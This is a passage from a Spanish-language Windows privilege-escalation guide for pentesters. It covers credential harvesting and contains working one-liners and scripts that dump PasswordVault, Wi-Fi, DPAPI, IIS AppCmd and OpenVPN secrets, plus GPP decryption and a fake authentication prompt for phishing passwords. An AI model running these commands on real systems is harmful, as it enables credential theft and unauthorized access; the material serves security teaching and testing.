Ten en cuenta que puedes usar mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) o el módulo [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Las aplicaciones UWP modernas de Windows, Microsoft Edge y los servicios modernos del sistema almacenan tokens de autenticación y contraseñas en texto claro dentro de `PasswordVault` de Universal Windows Platform (UWP) (también disponible como `Web Credentials` en `vaultcmd`). Este espacio de almacenamiento está aislado por sesión y puede descifrarse de forma nativa sin privilegios administrativos ni `SeDebugPrivilege`.

Ejecuta este comando de PowerShell dentro de la sesión activa del usuario para volcar y descifrar al instante todos los nombres de usuario y las contraseñas en texto claro almacenados:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

La **Data Protection API (DPAPI)** proporciona un método para el cifrado simétrico de datos, utilizado principalmente dentro del sistema operativo Windows para el cifrado simétrico de claves privadas asimétricas. Este cifrado aprovecha un secreto del usuario o del sistema para contribuir significativamente a la entropía.

**DPAPI permite cifrar claves mediante una clave simétrica derivada de los secretos de inicio de sesión del usuario**. En escenarios que implican el cifrado del sistema, utiliza los secretos de autenticación del dominio del sistema.

Las claves RSA de usuario cifradas mediante DPAPI se almacenan en el directorio `%APPDATA%\Microsoft\Protect\{SID}`, donde `{SID}` representa el [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) del usuario. **La clave DPAPI, que se encuentra junto a la clave maestra que protege las claves privadas del usuario en el mismo archivo**, suele constar de 64 bytes de datos aleatorios. (Es importante tener en cuenta que el acceso a este directorio está restringido, lo que impide listar su contenido mediante el comando `dir` en CMD, aunque sí se puede listar a través de PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Puedes usar el **módulo mimikatz** `dpapi::masterkey` con los argumentos adecuados (`/pvk` o `/rpc`) para descifrarla.

Los **archivos de credenciales protegidos por la contraseña maestra** suelen estar ubicados en:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You puedes usar el **módulo mimikatz** `dpapi::cred` con el `/masterkey` adecuado para descifrar.\
Puedes **extraer muchas** **masterkeys** de **DPAPI** de la **memoria** con el módulo `sekurlsa::dpapi` (si tienes acceso root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenciales de PowerShell

Las **credenciales de PowerShell** suelen usarse para tareas de **scripting** y automatización como una forma cómoda de almacenar credenciales cifradas. Las credenciales están protegidas mediante **DPAPI**, lo que normalmente significa que solo puede descifrarlas el mismo usuario en el mismo equipo en el que se crearon.

Una credencial exportada puede tener un nombre de archivo arbitrario o una ruta `.xml`. Cuando un script o un inventario de archivos apunta a una, resuelve el directorio de perfil real de la cuenta en lugar de dar por sentado que está en `C:\Users`: [Windows puede colocar los perfiles en otras ubicaciones](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Un archivo legible es solo una pista; [Windows `Export-Clixml` vincula una credencial cifrada al usuario y al equipo que la exportan](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), y cualquier cuenta recuperada debe tener por separado permisos válidos en el servicio de destino. Inspecciona primero las rutas y las ACL, sin mostrar valores cifrados ni en texto plano durante la enumeración rutinaria.

Para **descifrar** credenciales de PS del archivo que las contiene, puedes hacer lo siguiente:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Conexiones RDP guardadas

Puedes encontrarlas en `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
y en `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Comandos ejecutados recientemente

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Administrador de credenciales de Escritorio remoto**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Usa el módulo `dpapi::rdg` de **Mimikatz** con el `/masterkey` adecuado para **descifrar cualquier archivo .rdg**\
Puedes **extraer muchas masterkeys de DPAPI** de la memoria con el módulo `sekurlsa::dpapi` de Mimikatz

**mRemoteNG usa un almacén de conexiones diferente.** Examina el XML legible en `%APPDATA%\mRemoteNG` y en los Documentos del usuario, incluidos los archivos con nombres comunes como `config.xml`. Identifica el esquema de conexiones y los atributos `Password` cifrados antes de considerar un archivo XML como posible fuente de credenciales. El valor almacenado no es una contraseña de DPAPI/RDCMan; la recuperación depende de la configuración de cifrado del archivo y de si se usó una contraseña maestra personalizada. Evita mostrar valores cifrados durante la enumeración general.

**Las exportaciones de perfiles de Remote Desktop Plus** también pueden encontrarse en directorios de usuario o en una carpeta de administración compartida. Una exportación heredada `profiles.xml` contiene entradas `Data/Profile` con elementos `ProfileName`, `Password` y `Secure`. Considera un elemento de contraseña no vacío como una posible pista de credenciales, pero no lo muestres ni asumas que está en texto plano: [el proveedor indica](https://www.donkz.nl/) que la protección de perfiles puede estar vinculada a la cuenta y al equipo usados para crearlos, o configurarse con menos restricciones. Confirma el origen del archivo y las condiciones de recuperación antes de confiar en él.

### Sticky Notes

A veces, las personas guardan contraseñas y otra información en aplicaciones de notas adhesivas. La aplicación Sticky Notes empaquetada de Microsoft suele almacenar las notas en `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; las aplicaciones antiguas o diferentes pueden usar otros almacenes del perfil de usuario, incluido LevelDB. Identifica la aplicación instalada y el formato de almacenamiento antes de concluir que no hay notas porque falta un archivo SQLite.

Si Sticky Notes usa el registro de escritura anticipada de SQLite, una copia de `plum.sqlite` por sí sola puede omitir notas confirmadas recientemente. Conserva el archivo `plum.sqlite-wal` correspondiente junto con una copia coherente de la base de datos e incluye `plum.sqlite-shm` si está disponible; el índice de memoria compartida puede reconstruirse, pero el WAL forma parte del estado persistente de la base de datos. Consulta [la documentación de WAL de SQLite](https://www.sqlite.org/wal.html). Una nota que contenga un nombre de cuenta o una contraseña es solo una posible pista de credenciales: verifica por separado la cuenta, los permisos de acceso y la reutilización de contraseñas. Un registro cifrado de un administrador de contraseñas requiere además su clave de descifrado real y una interpretación específica de la aplicación para poder confirmar un inicio de sesión con privilegios superiores.

### AppCmd.exe

**Ten en cuenta que para recuperar contraseñas de AppCmd.exe debes ser Administrator y ejecutarlo con un nivel de integridad alto.**\
**AppCmd.exe** se encuentra en el directorio `%systemroot%\system32\inetsrv\`.\
Si este archivo existe, es posible que se hayan configurado algunas **credenciales** y que puedan **recuperarse**.

Este código se extrajo de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Comprueba si existe `C:\Windows\CCM\SCClient.exe`.\
Los instaladores se **ejecutan con privilegios de SYSTEM**; muchos son vulnerables a **DLL Sideloading (Información de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Archivos y registro (credenciales)

### Artefactos de credenciales en el registro de herramientas de soporte

Algunas instalaciones antiguas de soporte remoto conservan nombres de valores relacionados con contraseñas bajo claves fijas del registro de la aplicación. Por ejemplo, según la [explicación del proveedor sobre la clave del registro](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), en las versiones anteriores a la 9, `SecurityPasswordAES` identificaba una contraseña estática de sesión configurada en TeamViewer. Un marcador en el nombre de un valor solo es una pista para revisar: verifique la versión instalada, si los datos del valor se pueden leer, su formato y el comportamiento actual de autenticación antes de evaluar esa credencial. Pasar de una contraseña de soporte remoto a una cuenta de Windows con más privilegios también requiere que la contraseña se reutilice realmente y que se tenga autorización para esa cuenta. No incluya texto cifrado ni contraseñas recuperadas en la salida de enumeración rutinaria.

### Hojas de cálculo compartidas con hojas protegidas

Si se sospecha que un libro compartido legible contiene datos de cuentas, distinga entre el **cifrado del archivo** y la protección de hojas de cálculo o las columnas ocultas. [Microsoft indica](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) que la protección de hojas de cálculo controla la edición y no es una función de seguridad; por sí sola, no demuestra que el contenido del libro esté cifrado. Revise únicamente archivos autorizados y pertinentes, y evite mostrar posibles secretos durante la enumeración general. Que exista una ruta legible a un archivo `.xlsx`, una hoja protegida o una columna oculta no demuestra por sí solo que haya credenciales ni que alguna cuenta tenga más privilegios; verifique por separado los datos reales y los permisos actuales de la cuenta.

### Parches de cambios conservados por un servidor de CI

Un servidor de CI puede conservar los cambios de código fuente enviados en su directorio de datos incluso después de finalizar la compilación. [TeamCity documenta](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` como almacenamiento de los cambios de ejecuciones remotas; el directorio de datos se puede configurar y no necesariamente se encuentra en `ProgramData`. Un parche legible puede conservar referencias eliminadas o añadidas a un archivo de credenciales, una clave de cifrado o un script que use ambos. Por ejemplo, un flujo de trabajo de PowerShell con `ConvertTo-SecureString -Key` requiere tanto la clave AES como la cadena cifrada; [Microsoft documenta](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) que la clave se proporciona por separado. Primero revise solo los nombres de los parches accesibles; luego, con autorización, inspeccione el contenido pertinente sin mostrar secretos en la salida de enumeración rutinaria. Una ruta a un parche, un valor cifrado o una referencia a una clave no demuestra por sí sola que exista una credencial válida o acceso con más privilegios. Restrinja las ACL del directorio de datos y evite incluir secretos en los cambios de compilación.

### Rotación personalizada de contraseñas de administrador local

Un rotador de contraseñas hecho en casa puede almacenar una contraseña cifrada de administrador local en un servicio local y, al mismo tiempo, guardar las credenciales de su almacén de datos en un archivo `.env` legible o junto al binario del actualizador. Revise conjuntamente la tarea programada del actualizador, la cuenta, las ACL de configuración, el listener y los permisos del almacén de datos. Un almacén de datos que solo escucha en loopback sigue siendo accesible para un usuario local con credenciales válidas, pero la autenticación por sí sola no demuestra que tenga permiso para leer los registros pertinentes. Si la semilla de cifrado o el material de la clave están accesibles junto al texto cifrado, revise la derivación exacta de la clave antes de confiar en el cifrado. Un esquema que deriva determinísticamente una clave AES de una semilla expuesta mediante [`math/rand`](https://pkg.go.dev/math/rand) de Go no es adecuado para proteger esa contraseña; Go documenta que ese paquete no es apropiado para generar números aleatorios en contextos sensibles a la seguridad. Confirme que cualquier contraseña recuperada siga siendo válida y pertenezca a una cuenta del grupo Administrators local antes de considerarla una vía de escalada. Una tarea programada, una ruta a `.env` o un bloque cifrado no demuestra ninguna de esas condiciones. No incluya contraseñas ni material de claves en la salida de enumeración rutinaria.

Use [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) para administrar las contraseñas de administrador local. Su almacenamiento respaldado por directorio o Entra y sus controles de acceso son distintos de los de un almacén de datos local personalizado; asimismo, los [roles de Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) determinan si un usuario autenticado del almacén de datos puede leer un índice específico.

### Archivos de plugins de servidor Java y reutilización de credenciales

Algunos plugins de servidor Java se distribuyen como archivos JAR en el directorio `plugins` de un servidor. Un plugin personalizado legible puede contener configuración o bytecode con una credencial de servicio integrada. Revise el archivo únicamente si tiene autorización y no incluya secretos recuperados en la salida de enumeración rutinaria. La ruta a un plugin no demuestra por sí sola que exista un secreto, y una contraseña de servicio recuperada solo permite acceder a privilegios superiores si también es válida para una cuenta con más privilegios. Compruebe las ACL de los archivos pertinentes y sustituya las credenciales reutilizadas por secretos distintos. Consulte la [guía de instalación de plugins de PaperMC](https://docs.papermc.io/paper/adding-plugins/) para conocer la estructura de directorios y la [documentación de JAR de Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) para conocer el contenido de los archivos.

### Credenciales de la base de datos integrada de Openfire

Una instalación de Openfire que use su base de datos integrada puede guardar `openfire.script` en `Openfire\embedded-db`. Si la cuenta actual puede leerlo, revise conjuntamente los registros `OFUSER` y la propiedad `passwordKey`. La [documentación del proveedor de usuarios](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) de Openfire indica que las contraseñas pueden almacenarse en texto sin formato o cifrarse con una clave guardada en esa propiedad. Una contraseña recuperada solo importa para una escalada si sigue siendo válida para una identidad con más privilegios; el nombre del archivo no demuestra ni que se pueda leer ni que las credenciales se reutilicen. La ruta sirve como indicio para el inventario, así que no incluya el contenido de la base de datos ni las credenciales en la salida de enumeración rutinaria.

El archivo independiente `Openfire\conf\openfire.xml` puede revelar los puertos configurados y la interfaz de enlace de la consola de administración, incluso si se usa una base de datos externa. Openfire suele enlazar su consola de administración a loopback; aun así, una cuenta local puede acceder a esa dirección si el listener está activo. Compruebe conjuntamente el listener real, el rol de administrador autorizado, la política de carga de plugins y la identidad del servicio de Openfire. Un administrador que pueda instalar un plugin puede hacer que su código se ejecute en el contexto del servicio, que puede tener muchos privilegios si el servicio se ejecuta como LocalSystem. Que coincida una contraseña de cuenta o que haya una ruta de configuración legible no demuestra por sí solo el acceso a la consola de administración ni la ejecución de código. Consulte la [guía de instalación y administración de plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) del proveedor y la [propiedad de la API de carga de plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Configuración del servidor de administración forense

Las configuraciones del servidor Velociraptor, que suelen llamarse `server.config.yaml`, pueden contener `CA.private_key` de la CA interna. Si un usuario con menos privilegios puede leer esa clave, podría emitir un certificado de cliente de API. Que esto permita obtener más privilegios depende de los roles de usuario del servidor, la accesibilidad de la API y la identidad con la que se ejecuta el servidor o el agente objetivo. Una configuración de cliente contiene material distinto; encontrar una no demuestra que se tenga acceso a la CA del servidor. Algunas implementaciones mantienen la clave privada de la CA sin conexión, por lo que es posible que una configuración del servidor legible tampoco contenga la clave de firma.

En un servidor Windows, inspeccione la ACL de la configuración del **servidor** en su directorio de instalación y la de las copias de seguridad protegidas. Una ubicación posible es `%ProgramFiles%\VelociraptorServer\server.config.yaml`; si la ruta configurada para el servicio es distinta, use esa. Confirme que la identidad actual puede leer el archivo y que `CA.private_key` está realmente presente. Evite mostrar la clave privada en registros o en la salida de enumeración. El flujo de trabajo del proveedor `config api_client` usa la clave de la CA para emitir un certificado de cliente, pero también se necesita un rol efectivo en el servidor; crear o modificar uno puede requerir acceso de escritura al almacén de datos o un reinicio. Una identidad privilegiada del servidor ya existente puede ofrecer una vía aunque no se disponga de esos permisos de escritura. Las consultas de API con permisos de ejecución se ejecutan en el contexto pertinente del servidor o del agente, que puede tener muchos privilegios.

Proteja la configuración del servidor y las copias de seguridad con ACL restrictivas, mantenga sin conexión la clave de firma de la CA cuando sea posible y limite los roles de API y el acceso a los listeners. Consulte la [documentación de la API de Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) y la [guía de configuración de seguridad](https://docs.velociraptor.app/docs/deployment/security/).

### Credenciales de PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY es un administrador de sesiones independiente. Su almacén cifrado nativo puede estar en `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, mientras que una copia de seguridad exportada de sesiones puede llamarse `sessions-backup.dat` y estar guardada en otro lugar. [La guía de exportación de SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) indica que las exportaciones están cifradas con contraseña y pueden contener sesiones, claves, scripts, etiquetas y relaciones; su [foro de soporte](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) identifica el almacén nativo. Comprueba primero los permisos y las rutas de los archivos. Encontrar cualquiera de estos archivos no revela su contraseña ni demuestra que alguna credencial guardada siga siendo válida o tenga privilegios superiores.

### Claves de host SSH de PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Claves SSH en el registro

Las claves privadas SSH pueden almacenarse en la clave del registro `HKCU\Software\OpenSSH\Agent\Keys`, así que deberías comprobar si hay algo interesante allí:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Si encuentras alguna entrada dentro de esa ruta, probablemente sea una clave SSH guardada. Está cifrada, pero se puede descifrar fácilmente usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Puedes encontrar más información sobre esta técnica aquí: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Si el servicio `ssh-agent` no se está ejecutando y quieres que se inicie automáticamente al arrancar, ejecuta:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Parece que esta técnica ya no es válida. Intenté crear algunas claves ssh, agregarlas con `ssh-add` e iniciar sesión mediante ssh en una máquina. La clave de registro HKCU\Software\OpenSSH\Agent\Keys no existe y procmon no identificó el uso de `dpapi.dll` durante la autenticación con clave asimétrica.

### Archivos desatendidos

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

También puedes buscar estos archivos usando **metasploit**: _post/windows/gather/enum_unattend_

Contenido de ejemplo:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Copias de seguridad de SAM y SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Los archivos de backup de Windows Imaging (`.wim`) que se pueden leer también pueden contener hives `SAM`, `SECURITY` y `SYSTEM` sin conexión. Prioriza los directorios de backup o imagen accesibles localmente e inspecciona los **nombres de los miembros** de una imagen antes de extraer nada; el nombre de un archivo `.wim` por sí solo no demuestra que exponga hives, y las imágenes habituales `install.wim`, `boot.wim` y de recuperación suelen ser falsos positivos. Un recurso compartido SMB es una vía de acceso independiente y solo debe comprobarse si está dentro del alcance. Consulta la [guía de Microsoft sobre imágenes de Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) y la [referencia de archivos de registry hives](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Credenciales en la nube

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Busca un archivo llamado **SiteList.xml**

### Contraseña de GPP en caché

Anteriormente, había una función que permitía implementar cuentas de administrador local personalizadas en un grupo de máquinas mediante Group Policy Preferences (GPP). Sin embargo, este método tenía importantes fallos de seguridad. En primer lugar, cualquier usuario del dominio podía acceder a los Group Policy Objects (GPO), almacenados como archivos XML en SYSVOL. En segundo lugar, cualquier usuario autenticado podía descifrar las contraseñas de estos GPP, cifradas con AES256 mediante una clave predeterminada documentada públicamente. Esto suponía un grave riesgo, ya que podía permitir que los usuarios obtuvieran privilegios elevados.

Para mitigar este riesgo, se desarrolló una función que busca archivos GPP almacenados localmente en caché que contengan un campo "cpassword" no vacío. Al encontrar uno de estos archivos, la función descifra la contraseña y devuelve un objeto personalizado de PowerShell. Este objeto incluye detalles sobre el GPP y la ubicación del archivo, lo que ayuda a identificar y remediar esta vulnerabilidad de seguridad.

Busca estos archivos en `C:\ProgramData\Microsoft\Group Policy\history` o en _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior a Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Para descifrar el cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Usar crackmapexec para obtener las contraseñas:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Configuración web de IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Ejemplo de web.config con credenciales:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archivos de backup en un webroot de IIS

Un backup ZIP antiguo ubicado directamente en un webroot servido puede exponer archivos de configuración anteriores y credenciales reutilizables. Comprueba la ruta física configurada para el sitio y si se puede acceder realmente al archivo mediante HTTP antes de considerarlo una exposición. La ruta predeterminada `C:\inetpub\wwwroot` es solo una posibilidad. Un inventario local rápido puede enumerar nombres y tamaños sin abrir los archivos:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

El nombre de un archivo comprimido no demuestra que contenga un secreto ni que una credencial recuperada otorgue privilegios superiores.

### Credenciales de OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Registros

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Solicitar credenciales

Siempre puedes **pedirle al usuario que introduzca sus credenciales o incluso las de otro usuario** si crees que puede conocerlas (ten en cuenta que **pedirle** directamente al cliente sus **credenciales** es realmente **arriesgado**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Posibles nombres de archivo que contienen credenciales**

Archivos conocidos que en algún momento contenían **contraseñas** en **texto sin cifrar** o **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

